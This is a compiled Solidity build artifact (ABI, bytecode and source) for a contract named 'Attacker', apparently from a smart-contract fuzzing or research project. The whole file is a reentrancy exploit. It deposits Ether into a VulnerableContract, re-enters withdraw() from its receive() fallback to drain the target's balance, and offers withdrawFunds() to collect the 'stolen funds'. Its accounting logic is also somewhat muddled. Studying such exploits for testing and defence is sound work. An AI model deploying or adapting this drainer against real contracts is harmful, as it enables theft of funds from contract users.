{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "drainedAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "prevBalanceVulnerableContract",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "targetAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalWithdraw",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract VulnerableContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_targetAmount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x608060405260035460055534801561001657600080fd5b50604051610b43380380610b43833981810160405281019061003891906100d4565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610146565b6000815190506100ce8161012f565b92915050565b6000602082840312156100e657600080fd5b60006100f4848285016100bf565b91505092915050565b60006101088261010f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610138816100fd565b811461014357600080fd5b50565b6109ee806101556000396000f3fe60806040526004361061008a5760003560e01c8063846700621161005957806384670062146102595780638da5cb5b14610284578063953b8fb8146102af578063d0e30db0146102da578063f66ad59a146102e4576101cb565b80630f5ea827146101d057806324600fc3146101fb578063455fd6231461021257806364dd891a1461023d576101cb565b366101cb5760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163190506002546005541080156100e157508060045410155b156101c8578060055411156100f857806005819055505b6003546005600082825461010c9190610888565b925050819055506003546004600082825461012791906108de565b92505081905550600060035411156101c75760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6003546040518263ffffffff1660e01b8152600401610194919061085c565b600060405180830381600087803b1580156101ae57600080fd5b505af11580156101c2573d6000803e3d6000fd5b505050505b5b50005b600080fd5b3480156101dc57600080fd5b506101e561030f565b6040516101f2919061085c565b60405180910390f35b34801561020757600080fd5b50610210610315565b005b34801561021e57600080fd5b50610227610410565b604051610234919061085c565b60405180910390f35b61025760048036038101906102529190610664565b610416565b005b34801561026557600080fd5b5061026e6105f7565b60405161027b919061085c565b60405180910390f35b34801561029057600080fd5b506102996105fd565b6040516102a691906107c6565b60405180910390f35b3480156102bb57600080fd5b506102c4610623565b6040516102d1919061085c565b60405180910390f35b6102e2610629565b005b3480156102f057600080fd5b506102f961062b565b60405161030691906107e1565b60405180910390f35b60035481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103a5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039c906107fc565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561040d573d6000803e3d6000fd5b50565b60055481565b60003411610459576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104509061081c565b60405180910390fd5b6000811161049c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104939061083c565b60405180910390fd5b806002819055503460038190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561051257600080fd5b505af1158015610526573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163160048190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016105c2919061085c565b600060405180830381600087803b1580156105dc57600080fd5b505af11580156105f0573d6000803e3d6000fd5b5050505050565b60045481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008135905061065e816109a1565b92915050565b60006020828403121561067657600080fd5b60006106848482850161064f565b91505092915050565b61069681610912565b82525050565b6106a58161094e565b82525050565b60006106b8601783610877565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b60006106f8602183610877565b91507f4e65656420746f2073656e6420736f6d6520457468657220746f20617474616360008301527f6b000000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061075e602483610877565b91507f54617267657420616d6f756e74206d757374206265206772656174657220746860008301527f616e2030000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b6107c081610944565b82525050565b60006020820190506107db600083018461068d565b92915050565b60006020820190506107f6600083018461069c565b92915050565b60006020820190508181036000830152610815816106ab565b9050919050565b60006020820190508181036000830152610835816106eb565b9050919050565b6000602082019050818103600083015261085581610751565b9050919050565b600060208201905061087160008301846107b7565b92915050565b600082825260208201905092915050565b600061089382610944565b915061089e83610944565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156108d3576108d2610972565b5b828201905092915050565b60006108e982610944565b91506108f483610944565b92508282101561090757610906610972565b5b828203905092915050565b600061091d82610924565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061095982610960565b9050919050565b600061096b82610924565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6109aa81610944565b81146109b557600080fd5b5056fea264697066735822122019c425ea3f30aacf2f6674f2d527742160b18fbb2e03204085c6ee99995503a264736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./VulnerableContract.sol\";\r\n\r\ncontract Attacker {\r\n    VulnerableContract public vulnerable;\r\n    address public owner;\r\n    uint256 public targetAmount;  // Amount to drain\r\n    uint256 public drainedAmount;  // Amount already drained\r\n    uint256 public prevBalanceVulnerableContract;  // Amount to drain\r\n    uint256 public totalWithdraw = drainedAmount; //targetAmount - drainedAmount;\r\n\r\n    constructor(address payable _vulnerableAddress) {\r\n        vulnerable = VulnerableContract(_vulnerableAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Fallback function for reentrancy\r\n    receive() external payable {\r\n        uint256 vulnBalance = address(vulnerable).balance;\r\n        \r\n       // uint256 attackBalance = address(this).balance;\r\n        if (totalWithdraw < targetAmount && prevBalanceVulnerableContract >= vulnBalance) {\r\n            \r\n            \r\n            if (totalWithdraw > vulnBalance) {\r\n                totalWithdraw = vulnBalance;  // Cap withdrawal to remaining balance\r\n            }\r\n            //drainedAmount += amountToWithdraw;\r\n            totalWithdraw += drainedAmount;\r\n            prevBalanceVulnerableContract -= drainedAmount;\r\n            if (drainedAmount>0) {\r\n                vulnerable.withdraw(drainedAmount);\r\n              }  // Reenter to withdraw\r\n            \r\n        }\r\n    }\r\n\r\n    // Initiate the attack with a specific target amount\r\n    function attack(uint256 _targetAmount) external payable {\r\n        require(msg.value > 0, \"Need to send some Ether to attack\");\r\n        require(_targetAmount > 0, \"Target amount must be greater than 0\");\r\n        targetAmount = _targetAmount;\r\n        drainedAmount = msg.value;\r\n        \r\n\r\n        // Deposit initial amount to vulnerable contract\r\n        vulnerable.deposit{value: msg.value}();\r\n\r\n        prevBalanceVulnerableContract = address(vulnerable).balance;\r\n\r\n        // Start reentrancy attack with the initial deposit\r\n        vulnerable.withdraw(msg.value);  // Start by withdrawing the initial deposit\r\n    }\r\n\r\n    // Withdraw stolen funds\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only owner can withdraw\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n     // Function to allow the contract to receive Ether\r\n    function deposit() external payable {\r\n        // Function to handle incoming Ether\r\n    }\r\n   \r\n}\r\n",
  "sourcePath": "C:\\Users\\andri\\dev\\github\\smartcontractdrlfuz\\env1_dev2\\contracts\\Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-22T17:06:54.127Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}